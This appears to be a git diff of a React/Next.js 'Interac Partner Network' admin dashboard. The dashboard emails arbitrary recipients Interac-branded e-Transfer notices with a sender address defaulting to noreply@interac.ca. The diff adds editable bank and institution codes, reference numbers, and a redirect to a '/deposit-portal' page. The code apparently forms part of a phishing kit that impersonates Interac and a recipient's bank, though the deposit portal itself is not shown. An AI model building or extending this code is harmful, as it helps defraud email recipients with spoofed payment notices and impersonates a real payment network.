@@ -1,7 +1,6 @@
 "use client"
 
 import type React from "react"
-
 import { useState } from "react"
 import { Send, DollarSign, Mail, User, ArrowRight, CheckCircle, AlertCircle, Clock, Eye } from "lucide-react"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
@@ -13,6 +12,7 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/u
 import { InteracEmailLayout } from "@/components/email/interac-email-layout"
 import { TransferCard } from "@/components/email/transfer-card"
 import { MessageSection } from "@/components/email/message-section"
+import { useRouter } from "next/navigation"
 
 interface TransferStatus {
   id: string
@@ -39,10 +39,15 @@ export default function AdminDashboard() {
     message: "",
     securityQuestion: "",
     securityAnswer: "",
+    bankName: "Banking System",
+    institutionCode: "000",
+    branchCode: "00000",
+    reference: "",
   })
 
   const [recentTransfers, setRecentTransfers] = useState<TransferStatus[]>([])
   const [previewTransfer, setPreviewTransfer] = useState<TransferStatus | null>(null)
+  const router = useRouter()
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -50,12 +55,22 @@ export default function AdminDashboard() {
     setSubmitStatus({ type: null, message: "" })
 
     try {
+      const reference = formData.reference || `INTC-${Date.now().toString().slice(-6)}`
+
       const response = await fetch("/api/send-interac", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify(formData),
+        body: JSON.stringify({
+          ...formData,
+          reference,
+          senderEmail:
+            typeof window !== "undefined"
+              ? process.env.NEXT_PUBLIC_SENDER_EMAIL || "noreply@interac.ca"
+              : "noreply@interac.ca",
+          appUrl: typeof window !== "undefined" ? process.env.NEXT_PUBLIC_APP_URL || window.location.origin : "",
+        }),
       })
 
       const data = await response.json()
@@ -65,7 +80,7 @@ export default function AdminDashboard() {
       }
 
       const newTransfer: TransferStatus = {
-        id: data.transferId || `TXN-${Date.now()}`,
+        id: reference,
         recipient: formData.recipientEmail,
         recipientName: formData.recipientName,
         amount: Number.parseFloat(formData.amount),
@@ -81,6 +96,19 @@ export default function AdminDashboard() {
         message: `Interac e-Transfer of $${formData.amount} successfully sent to ${formData.recipientEmail}`,
       })
 
+      setTimeout(() => {
+        const transferParams = new URLSearchParams({
+          transferId: reference,
+          amount: formData.amount,
+          recipient: formData.recipientEmail,
+          recipientName: formData.recipientName,
+          bankName: formData.bankName,
+          message: formData.message || "",
+          timestamp: new Date().toISOString(),
+        })
+        router.push(`/deposit-portal?${transferParams.toString()}`)
+      }, 2000)
+
       setFormData({
         recipientEmail: "",
         recipientName: "",
@@ -88,6 +116,10 @@ export default function AdminDashboard() {
         message: "",
         securityQuestion: "",
         securityAnswer: "",
+        bankName: "Banking System",
+        institutionCode: "000",
+        branchCode: "00000",
+        reference: "",
       })
     } catch (error) {
       setSubmitStatus({
@@ -123,14 +155,14 @@ export default function AdminDashboard() {
               />
             </div>
             <div>
-              <h1 className="text-2xl font-bold text-foreground">Interac Partner Network  </h1>
-              <p className="text-sm text-muted-foreground">e-Transfer Management Dashboard Portal </p>
+              <h1 className="text-2xl font-bold text-foreground">Interac Partner Network</h1>
+              <p className="text-sm text-muted-foreground">e-Transfer Management Dashboard Portal</p>
             </div>
           </div>
         </div>
       </header>
 
-      <main className="container mx-auto px-4 py-8 max-w-7xl bg-[rgba(40,41,42,1)]">
+      <main className="container mx-auto px-4 py-8 max-w-7xl">
         <div className="grid lg:grid-cols-3 gap-6">
           {/* Transfer Form */}
           <div className="lg:col-span-2">
@@ -194,22 +226,36 @@ export default function AdminDashboard() {
                       Transfer Details
                     </h3>
 
-                    <div className="space-y-2">
-                      <Label htmlFor="amount">
-                        Amount (CAD)
-                        <span className="text-red-500 ml-1">*</span>
-                      </Label>
-                      <Input
-                        id="amount"
-                        type="number"
-                        step="0.01"
-                        min="0.01"
-                        placeholder="100.00"
-                        value={formData.amount}
-                        onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
-                        className="border-2 focus-visible:ring-[#FDB913] text-lg font-semibold"
-                        required
-                      />
+                    <div className="grid md:grid-cols-2 gap-4">
+                      <div className="space-y-2">
+                        <Label htmlFor="amount">
+                          Amount (CAD)
+                          <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="amount"
+                          type="number"
+                          step="0.01"
+                          min="0.01"
+                          placeholder="100.00"
+                          value={formData.amount}
+                          onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
+                          className="border-2 focus-visible:ring-[#FDB913] text-lg font-semibold"
+                          required
+                        />
+                      </div>
+
+                      <div className="space-y-2">
+                        <Label htmlFor="reference">Reference Number</Label>
+                        <Input
+                          id="reference"
+                          type="text"
+                          placeholder="Auto-generated"
+                          value={formData.reference}
+                          onChange={(e) => setFormData({ ...formData, reference: e.target.value })}
+                          className="border-2 focus-visible:ring-[#FDB913] font-mono"
+                        />
+                      </div>
                     </div>
 
                     <div className="space-y-2">
@@ -223,6 +269,47 @@ export default function AdminDashboard() {
                         maxLength={200}
                       />
                       <p className="text-xs text-muted-foreground">{formData.message.length}/200 characters</p>
+                    </div>
+
+                    {/* Bank Information */}
+                    <div className="grid md:grid-cols-3 gap-4 pt-2">
+                      <div className="space-y-2">
+                        <Label htmlFor="bankName">Bank Name</Label>
+                        <Input
+                          id="bankName"
+                          type="text"
+                          placeholder="Banking System"
+                          value={formData.bankName}
+                          onChange={(e) => setFormData({ ...formData, bankName: e.target.value })}
+                          className="border-2 focus-visible:ring-[#FDB913]"
+                        />
+                      </div>
+
+                      <div className="space-y-2">
+                        <Label htmlFor="institutionCode">Institution Code</Label>
+                        <Input
+                          id="institutionCode"
+                          type="text"
+                          placeholder="000"
+                          value={formData.institutionCode}
+                          onChange={(e) => setFormData({ ...formData, institutionCode: e.target.value })}
+                          className="border-2 focus-visible:ring-[#FDB913] font-mono"
+                          maxLength={3}
+                        />
+                      </div>
+
+                      <div className="space-y-2">
+                        <Label htmlFor="branchCode">Branch Code</Label>
+                        <Input
+                          id="branchCode"
+                          type="text"
+                          placeholder="00000"
+                          value={formData.branchCode}
+                          onChange={(e) => setFormData({ ...formData, branchCode: e.target.value })}
+                          className="border-2 focus-visible:ring-[#FDB913] font-mono"
+                          maxLength={5}
+                        />
+                      </div>
                     </div>
                   </div>
 
@@ -336,7 +423,8 @@ export default function AdminDashboard() {
                       >
                         <div className="flex items-start justify-between mb-2">
                           <div className="flex-1 min-w-0">
-                            <p className="font-semibold text-sm truncate">{transfer.recipient}</p>
+                            <p className="font-semibold text-sm truncate">{transfer.recipientName}</p>
+                            <p className="text-xs text-muted-foreground truncate">{transfer.recipient}</p>
                             <p className="text-xs text-muted-foreground">{formatTimestamp(transfer.timestamp)}</p>
                           </div>
                           <div className="flex items-center gap-2">
@@ -355,8 +443,8 @@ export default function AdminDashboard() {
                           </div>
                         </div>
                         <div className="flex items-center justify-between">
-                          <span className="text-lg font-bold text-[#FDB913]">${transfer.amount.toFixed(2)}</span>
-                          <span className="text-xs text-muted-foreground">{transfer.id}</span>
+                          <span className="text-lg font-bold text-[#FDB913]">${transfer.amount.toFixed(2)} CAD</span>
+                          <span className="text-xs text-muted-foreground font-mono">{transfer.id}</span>
                         </div>
                       </div>
                     ))
@@ -369,31 +457,85 @@ export default function AdminDashboard() {
       </main>
 
       <Dialog open={previewTransfer !== null} onOpenChange={() => setPreviewTransfer(null)}>
-        <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
+        <DialogContent className="max-w-5xl max-h-[90vh] overflow-y-auto">
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2">
               <Mail className="w-5 h-5 text-[#FDB913]" />
-              Email Preview - {previewTransfer?.id}
+              Transaction Details - {previewTransfer?.id}
             </DialogTitle>
           </DialogHeader>
 
           {previewTransfer && (
-            <div className="mt-4">
-              <InteracEmailLayout senderName="Your Institution" institution="Your Bank">
-                <MessageSection
-                  recipientName={previewTransfer.recipientName}
-                  greeting={`Hi ${previewTransfer.recipientName},`}
-                  description="You've received a secure Interac e-Transfer."
-                />
+            <div className="space-y-6 mt-4">
+              {/* Transaction Summary Card */}
+              <div className="bg-zinc-900 rounded-2xl border border-zinc-800 p-6 space-y-6">
+                <div className="flex items-center justify-between pb-4 border-b border-zinc-800">
+                  <h3 className="text-lg font-semibold text-white">Transaction Details</h3>
+                  <span className="px-3 py-1 rounded-full text-xs font-medium bg-green-500/10 text-green-400 border border-green-500/20">
+                    {previewTransfer.status.toUpperCase()}
+                  </span>
+                </div>
 
-                <TransferCard
-                  amount={previewTransfer.amount}
-                  message={previewTransfer.message}
-                  securityQuestion={previewTransfer.securityQuestion || "Security question not provided"}
-                  depositLink="https://portal.hub-verify.innovation.interac.ca/playground/callback?error=access_denied&error_description=Verified.Me%20completed%20but%20data%20could%20not%20be%20matched&locale=en-CA&state=MAMsC6aFKcF-8uqj7tW5YYmjtP-iUCkk6ITdW__4Q5xpNDWPNjxfuSJZXsTXSmfCYiAnSuxRh-vn6GikHFK03A"
-                  transferId={previewTransfer.id}
-                />
-              </InteracEmailLayout>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                  <div className="space-y-1">
+                    <p className="text-sm text-zinc-500">Amount</p>
+                    <p className="text-xl font-bold text-white">${previewTransfer.amount.toFixed(2)} CAD</p>
+                  </div>
+
+                  <div className="space-y-1">
+                    <p className="text-sm text-zinc-500">Reference</p>
+                    <p className="text-base font-mono text-white">{previewTransfer.id}</p>
+                  </div>
+
+                  <div className="space-y-1">
+                    <p className="text-sm text-zinc-500">Payee</p>
+                    <p className="text-base text-white">{previewTransfer.recipientName}</p>
+                    <p className="text-sm text-zinc-400">{previewTransfer.recipient}</p>
+                  </div>
+
+                  <div className="space-y-1">
+                    <p className="text-sm text-zinc-500">Bank</p>
+                    <p className="text-base text-white">{formData.bankName}</p>
+                    <p className="text-sm text-zinc-400">
+                      {formData.institutionCode}-{formData.branchCode}
+                    </p>
+                  </div>
+
+                  {previewTransfer.message && (
+                    <div className="space-y-1 md:col-span-2">
+                      <p className="text-sm text-zinc-500">Memo</p>
+                      <p className="text-base text-white">{previewTransfer.message}</p>
+                    </div>
+                  )}
+
+                  <div className="space-y-1 md:col-span-2">
+                    <p className="text-sm text-zinc-500">Timestamp</p>
+                    <p className="text-sm font-mono text-zinc-400">
+                      {new Date(previewTransfer.timestamp).toLocaleString()}
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Email Preview */}
+              <div className="border rounded-lg p-4 bg-white">
+                <h4 className="font-semibold mb-4 text-zinc-900">Email Preview</h4>
+                <InteracEmailLayout senderName={formData.bankName} institution="Your Bank">
+                  <MessageSection
+                    recipientName={previewTransfer.recipientName}
+                    greeting={`Hi ${previewTransfer.recipientName},`}
+                    description="You've received a secure Interac e-Transfer."
+                  />
+
+                  <TransferCard
+                    amount={previewTransfer.amount}
+                    message={previewTransfer.message}
+                    securityQuestion={previewTransfer.securityQuestion || "Security question not provided"}
+                    depositLink="https://brandcentre.interac.ca/member-login/"
+                    transferId={previewTransfer.id}
+                  />
+                </InteracEmailLayout>
+              </div>
             </div>
           )}
         </DialogContent>
